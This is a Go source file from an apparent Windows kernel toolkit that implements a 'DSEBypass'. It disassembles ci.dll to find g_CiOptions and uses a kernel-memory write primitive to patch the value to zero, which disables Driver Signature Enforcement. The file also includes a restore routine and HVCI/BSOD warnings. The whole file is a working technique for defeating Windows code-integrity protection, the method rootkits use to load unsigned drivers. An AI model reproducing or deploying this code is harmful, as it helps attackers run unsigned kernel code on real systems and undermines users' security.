package ddk

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"

	"github.com/ddkwork/golibrary/std/mylog"
	"github.com/saferwall/pe"
	"golang.org/x/arch/x86/x86asm"
)

const (
	CI_OPT_ENABLED     uint32 = 0x00000001
	CI_OPT_IN_UM       uint32 = 0x00000002
	CI_OPT_IN_KM       uint32 = 0x00000004
	CI_OPT_TESTSIGN    uint32 = 0x00000008
	CI_OPT_DEBUGPOLICY uint32 = 0x00000010
	CI_OPT_HVCI_NEEDED uint32 = 0x00004000
	CI_OPT_HVCI_ACTIVE uint32 = 0x00008000
	CI_OPT_WHQL_SYSTEM uint32 = 0x00200000
	CI_OPT_VBS         uint32 = 0x01000000

	CI_OPTIONS_DSE_ENABLED uint32 = CI_OPT_IN_UM | CI_OPT_IN_KM
	CI_OPTIONS_DISABLED    uint32 = 0x0
)

type DSEBypass struct {
	finder            *KernelModuleFinder
	km                *KernelMemory
	ciOptionsAddr     uint64
	originalCiOptions uint32
	patched           bool
}

func NewDSEBypass(finder *KernelModuleFinder, km *KernelMemory) *DSEBypass {
	return &DSEBypass{finder: finder, km: km}
}

func (d *DSEBypass) FindCiOptionsRVAFromDisk() (uint32, error) {
	f := mylog.Check2(os.Open(`C:\Windows\System32\ci.dll`))
	peFile := mylog.Check2(pe.NewFile(f, &pe.Options{}))

	defer func() { mylog.Check(peFile.Close()) }()
	mylog.Check(peFile.Parse())

	var ciInitRVA uint32
	for _, fn := range peFile.Export.Functions {
		if fn.Name == "CiInitialize" {
			ciInitRVA = fn.FunctionRVA
			break
		}
	}
	if ciInitRVA == 0 {
		return 0, fmt.Errorf("CiInitialize export not found")
	}
	mylog.Info("CiInitialize RVA=0x" + fmt.Sprintf("%06X", ciInitRVA))

	for _, sec := range peFile.Sections {
		if !sec.Contains(ciInitRVA, peFile) {
			continue
		}
		data := sec.Data(0, 0, peFile)
		funcOff := int(ciInitRVA - sec.Header.VirtualAddress)

		for i := funcOff; i < len(data)-6; {
			inst, e := x86asm.Decode(data[i:], 64)
			if e != nil {
				break
			}

			if inst.Op == x86asm.CALL && inst.Len >= 5 {
				syntax := x86asm.IntelSyntax(inst, 0, nil)
				mylog.Success(syntax) // todo  像iopxxxconntrolfile 那样取出来才直观
				disp := int32(binary.LittleEndian.Uint32(data[i+1 : i+inst.Len]))
				target := ciInitRVA + uint32(i-funcOff) + uint32(inst.Len) + uint32(disp)
				mylog.Info("CiInitialize call +0x" + fmt.Sprintf("%04X", i-funcOff) + " -> 0x" + fmt.Sprintf("%06X", target))

				targetOff := int(target - sec.Header.VirtualAddress)
				for j := targetOff; j < len(data); {
					inst2, err2 := x86asm.Decode(data[j:], 64)
					if err2 != nil || inst2.Len == 0 {
						j++
						continue
					}

					if inst2.Op == x86asm.MOV && inst2.PCRel > 0 && inst2.Args[1] == x86asm.ECX {
						disp := binary.LittleEndian.Uint32(data[j+inst2.PCRelOff : j+inst2.PCRelOff+inst2.PCRel])
						targetRVA := uint32(uint64(target) + uint64(j-targetOff) + uint64(inst2.Len) + uint64(disp))
						syntax := x86asm.IntelSyntax(inst2, 0, nil)
						mylog.Success(syntax)
						mylog.Hex(targetRVA)
						return targetRVA, nil
					}

					if inst2.Op == x86asm.RET && j-targetOff > 10 {
						break
					}
					j += inst2.Len
				}
			}

			if inst.Op == x86asm.RET {
				break
			}
			i += inst.Len
		}
		return 0, fmt.Errorf("CiInitialize parsed but g_CiOptions ref not found")
	}
	return 0, fmt.Errorf("CiInitialize section not found")
}

func (d *DSEBypass) FindCiOptions() uint64 {
	ciBase := d.finder.ModuleBaseByName("ci.dll")

	ciOptionsRVA := mylog.Check2(d.FindCiOptionsRVAFromDisk())

	ciOptionsAddr := ciBase + uint64(ciOptionsRVA)
	mylog.Hex(ciOptionsAddr)

	val := d.km.ReadUint32(ciOptionsAddr)
	mylog.Success("g_CiOptions addr=0x" + fmt.Sprintf("%X", ciOptionsAddr) + " val=0x" + fmt.Sprintf("%08X", val))
	d.logCiConfig(val)
	return ciOptionsAddr
}

func (d *DSEBypass) logCiConfig(val uint32) {
	mylog.Info("CI config: [" + strings.Join(d.ParseCiConfigFlags(val), "|") + "]")
	if val&CI_OPT_IN_KM != 0 {
		mylog.Info("DSE=ON (patch IN_KM to disable)")
	}
	if val&CI_OPT_HVCI_ACTIVE != 0 {
		mylog.Warning("HVCI active - patching may BSOD")
	}
}

func (d *DSEBypass) ParseCiConfigFlags(val uint32) []string {
	var flags []string
	if val&CI_OPT_ENABLED != 0 {
		flags = append(flags, "ENABLED")
	}
	if val&CI_OPT_IN_UM != 0 {
		flags = append(flags, "IN_UM")
	}
	if val&CI_OPT_IN_KM != 0 {
		flags = append(flags, "IN_KM(DSE)")
	}
	if val&CI_OPT_TESTSIGN != 0 {
		flags = append(flags, "TESTSIGN")
	}
	if val&CI_OPT_DEBUGPOLICY != 0 {
		flags = append(flags, "DEBUGPOLICY")
	}
	if val&CI_OPT_HVCI_NEEDED != 0 {
		flags = append(flags, "HVCI_NEEDED")
	}
	if val&CI_OPT_HVCI_ACTIVE != 0 {
		flags = append(flags, "HVCI_ACTIVE")
	}
	if val&CI_OPT_WHQL_SYSTEM != 0 {
		flags = append(flags, "WHQL_SYSTEM")
	}
	if val&CI_OPT_VBS != 0 {
		flags = append(flags, "VBS")
	}
	return flags
}

func (d *DSEBypass) ReadCiOptions() uint32 {
	if d.ciOptionsAddr == 0 {
		d.ciOptionsAddr = d.FindCiOptions()
	}
	return d.km.ReadUint32(d.ciOptionsAddr)
}

func (d *DSEBypass) WriteCiOptions(val uint32) {
	if d.ciOptionsAddr == 0 {
		d.FindCiOptions()
	}
	d.km.WriteUint32(d.ciOptionsAddr, val)
}

func (d *DSEBypass) DSEEnabled() bool {
	val := d.ReadCiOptions()

	return (val & CI_OPT_IN_KM) != 0
}

func (d *DSEBypass) HVCIActive() bool {
	val := d.ReadCiOptions()

	return (val & CI_OPT_HVCI_ACTIVE) != 0
}

func (d *DSEBypass) Disable() bool {
	addr := d.FindCiOptions()

	d.ciOptionsAddr = addr

	currentVal := d.km.ReadUint32(addr)

	d.originalCiOptions = currentVal
	mylog.Info("current g_CiOptions=0x" + fmt.Sprintf("%08X", currentVal))

	if currentVal == CI_OPTIONS_DISABLED {
		mylog.Info("DSE already disabled, no action needed")
		d.patched = false
		return true
	}

	if (currentVal & (CI_OPT_HVCI_NEEDED | CI_OPT_HVCI_ACTIVE)) != 0 {
		mylog.Warning("HVCI detected g_CiOptions=0x" + fmt.Sprintf("%08X", currentVal))
		mylog.Info("direct g_CiOptions patching with HVCI active may cause BSOD")
	}

	d.km.WriteUint32(addr, CI_OPTIONS_DISABLED)

	verify := d.km.ReadUint32(addr)
	if verify != CI_OPTIONS_DISABLED {
		mylog.Warning("verify g_CiOptions failed", "expected", fmt.Sprintf("0x%08X", CI_OPTIONS_DISABLED),
			"got", fmt.Sprintf("0x%08X", verify))
		return false
	}

	d.patched = true
	mylog.Success("DSE disabled (g_CiOptions patched " + fmt.Sprintf("0x%08X -> 0x%08X", currentVal, CI_OPTIONS_DISABLED) + ")")
	return true
}

func (d *DSEBypass) Restore() bool {
	if !d.patched || d.ciOptionsAddr == 0 {
		mylog.Info("DSE was not patched by us, skipping restore")
		return true
	}

	currentVal := d.km.ReadUint32(d.ciOptionsAddr)

	if (currentVal & 0x6) != 0 {
		mylog.Info("DSE already enabled, restore skipped g_CiOptions=0x" + fmt.Sprintf("%08X", currentVal))
		d.patched = false
		return true
	}

	target := d.originalCiOptions
	if target == 0 {
		target = CI_OPTIONS_DSE_ENABLED
	}

	d.km.WriteUint32(d.ciOptionsAddr, target)

	verify := d.km.ReadUint32(d.ciOptionsAddr)
	if verify != target {
		mylog.Warning("verify restore failed", "expected", fmt.Sprintf("0x%08X", target),
			"got", fmt.Sprintf("0x%08X", verify))
		return false
	}

	mylog.Success("DSE restored (g_CiOptions " + fmt.Sprintf("0x%08X -> 0x%08X", currentVal, target) + ")")
	d.patched = false
	d.ciOptionsAddr = 0
	return true
}

func (d *DSEBypass) IsPatched() bool { return d.patched }
